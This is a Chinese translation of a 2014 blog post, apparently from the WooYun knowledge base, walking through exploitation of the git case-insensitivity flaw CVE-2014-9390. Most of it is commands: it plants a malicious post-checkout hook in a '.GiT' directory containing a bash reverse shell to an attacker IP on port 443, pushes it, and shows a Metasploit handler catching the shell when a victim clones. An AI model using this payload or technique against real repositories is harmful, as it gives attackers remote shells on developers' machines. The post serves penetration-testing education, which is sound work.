<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">One git command may cause you hacked(CVE-2014-9390)</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">夺吻狂魔</a> <span class="bull">·</span> <time title="2014/12/22 12:59" ui-time="" datetime="2014/12/22 12:59" class="published ng-binding ng-isolate-scope">2014/12/22 12:59</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from：https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/</p><h2>0x00 背景</h2><hr><p>CVE-2014-9390是最近很火的一个漏洞，一个git命令就可能导致你被黑，我不打算深入探讨这个漏洞的细节，官方已经在<a href="https://github.com/blog/1938-git-client-vulnerability-announced">https://github.com/blog/1938-git-client-vulnerability-announced</a> 和 <a href="http://article.gmane.org/gmane.linux.kernel/1853266">http://article.gmane.org/gmane.linux.kernel/1853266</a>发布了详细信息。总之，如果你使用了大小写不敏感的操作系统例如Windows或OSX，你应该更新git客户端了。</p><p>让我们以渗透测试的角度来看看这个漏洞。</p><h2>0x01 准备</h2><hr><p>我创建了一个命名为CVE-2014-9390的新项目。</p><p><img alt="enter image description here" img-src="8bcc0d6082446b2aa9740de37922ddd2b2401e17.jpg"></p><p>建立一个.GiT（大些G，小写i然后大写T）目录，创建一个vulnerable.txt文件，然后push到项目中。</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f1839e9e85b1839e9e859d9093">[email&#160;protected]</a>:~/cve-2014-9390# mkdir .GiT
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="186a77776c586a77776c74797a">[email&#160;protected]</a>:~/cve-2014-9390# cd .GiT/
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="11637e7e6551637e7e657d7073">[email&#160;protected]</a>:~/cve-2014-9390/.GiT# echo "Vulnerable" &gt;&gt; vulnerable.txt
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1e6c71716a5e6c71716a727f7c">[email&#160;protected]</a>:~/cve-2014-9390/.GiT# cd ..
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ddafb2b2a99dafb2b2a9b1bcbf">[email&#160;protected]</a>:~/cve-2014-9390# git add .
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7d0f1212093d0f121209111c1f">[email&#160;protected]</a>:~/cve-2014-9390# git commit -m 'poc'
[master bec157d] poc
1 file changed, 1 insertion(+)
create mode 100644 .GiT/vulnerable.txt
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="98eaf7f7ecd8eaf7f7ecf4f9fa">[email&#160;protected]</a>:~/cve-2014-9390# git push
</code></pre><p>我们再从Windows的电脑上用存在漏洞的git客户端pull同一个项目看看</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="35475a5a4159545775787c7b7670">[email&#160;protected]</a> ~
$ git clone <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9dfaf4e9ddfaf4e9f1fcffb3fef2f0">[email&#160;protected]</a>:mehmet/cve-2014-9390.git
Cloning into 'cve-2014-9390'...
Enter passphrase for key '/c/Users/rootlab/.ssh/id_rsa':
remote: Counting objects: 7, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 7 (delta 0), reused 0 (delta 0)R
Receiving objects: 100% (7/7), done.
Checking connectivity... done.
</code></pre><p>给大家看一下.git目录，本应该在.GiT目录的vulnerable.txt也在这里</p><p><img alt="enter image description here" img-src="5204a4bbef90d3ef6c3f4bbf7f8609d404726d3d.jpg"></p><h2>0x02 利用</h2><hr><h3>什么是git的hooks</h3><p>与许多其他版本控制系统类似，一些重要的动作发生时，git有一个方法来执行自定义的脚本。hooks分两方面：客户端和服务器端。当进行commit和merge时可以触发客户端的hooks。</p><p>当执行git命令如git pull和git checkout时就可以执行客户端的脚本。</p><h3>如何实现git hooks？</h3><p>重写.git/hooks目录下的一个脚本文件，然后执行他，我们可以通过这个漏洞来实现。</p><p>我们创建一个假的git目录然后建立一个叫post-checkout的文件。</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2f5d40405b6f5d40405b434e4d">[email&#160;protected]</a>:~/cve-2014-9390# mkdir .GiT/hooks
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e795888893a7958888938b8685">[email&#160;protected]</a>:~/cve-2014-9390# echo '#!/bin/sh' &gt; .GiT/hooks/post-checkout
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="20524f4f5460524f4f544c4142">[email&#160;protected]</a>:~/cve-2014-9390# echo 'bash -i &gt;&amp; /dev/tcp/[IPADDRESS]/443 0&gt;&amp;1' &gt;&gt; .GiT/hooks/post-checkout
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f5879a9a81b5879a9a81999497">[email&#160;protected]</a>:~/cve-2014-9390# git add .
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="493b26263d093b26263d25282b">[email&#160;protected]</a>:~/cve-2014-9390# git commit -m 'add reverse connection payload'
[master 389c979] add powershell payload
1 file changed, 4 insertions(+)
create mode 100644 .GiT/hooks/post-checkout
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b1c3dedec5f1c3dedec5ddd0d3">[email&#160;protected]</a>:~//cve-2014-9390# git push
</code></pre><p>我们在服务器端监听</p><pre><code>#!bash
msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set PAYLOAD generic/shell_reverse_tcp
msf exploit(handler) &gt; set LPORT 443
msf exploit(handler) &gt; set LHOST 108.61.164.142
msf exploit(handler) &gt; exploit
[*] Started reverse handler on 108.61.164.142:443
[*] Starting the payload handler...
</code></pre><p>我们clone https://gitlab.com/mehmet/cve-2014-9390</p><p><img alt="enter image description here" img-src="725120149894f7d7531492a15c04cec4a9c470ff.jpg"></p><p>看起来都是很正常，但是……</p><p><img alt="enter image description here" img-src="2ea5a13f98f39c178d454ebcc6bfd68e38f10099.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/3064" rel="bookmark" id="re1">CVE-2014-6271资料汇总</a></li><li><a href="http://drops.wooyun.org/papers/1018" rel="bookmark" id="re2">Shell Injection &amp; Command Injection</a></li><li><a href="http://drops.wooyun.org/papers/3795" rel="bookmark" id="re3">CVE-2014-0038内核漏洞原理与本地提权利用代码实现分析</a></li><li><a href="http://drops.wooyun.org/tips/2746" rel="bookmark" id="re4">metasploit渗透测试笔记(内网渗透篇)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2014-12-22 17:13:21</span></div><p></p><p>https://developer.atlassian.com/blog/2014/12/securing-your-git-server/</p><p>说的也不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">老妖</span> <span class="reply-time">2014-12-22 14:10:32</span></div><p></p><p>威猛啊， 多谢共享</p><p></p></div></div></div></div></div></main>